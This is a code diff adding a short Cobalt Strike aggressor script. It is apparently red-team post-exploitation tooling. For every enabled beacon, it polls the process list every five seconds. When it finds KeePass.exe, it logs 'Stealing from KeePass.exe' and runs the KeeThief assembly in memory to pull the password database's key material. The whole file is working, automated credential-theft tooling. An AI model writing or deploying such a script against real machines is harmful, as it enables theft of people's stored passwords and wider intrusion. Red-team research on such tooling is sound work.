@@ -1,0 +1,37 @@
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+        foreach $index => $beaconid (@beacons) {
+            bps($beaconid,&handleProcess);
+        }	
+}
+
+
+sub handleProcess{
+    $processList = $2;
+    $index = indexOf($processList, "KeePass.exe", 0) + 9;
+
+    if($index > 9){
+        $temp = substr($processList,$index,-1);
+        $pid = split("\t",$temp)[2];
+
+        if ($pid !in @pids){
+            add(@pids,$pid,0);
+            blog($1,"Stealing from KeePass.exe with PID: $pid");
+            bexecute_assembly($1, script_resource("modules/KeeThief.exe"));
+        }	
+    }	
+}
+
+
+alias KeeThief_enable {
+       blog($1, "\cBKeeThief enabled \n");
+       add(@beacons,$1,0);
+}
+
+
+alias KeeThief_disable {
+       blog($1, "\c4Disabling KeeThief");
+       remove(@beacons,$1);
+}
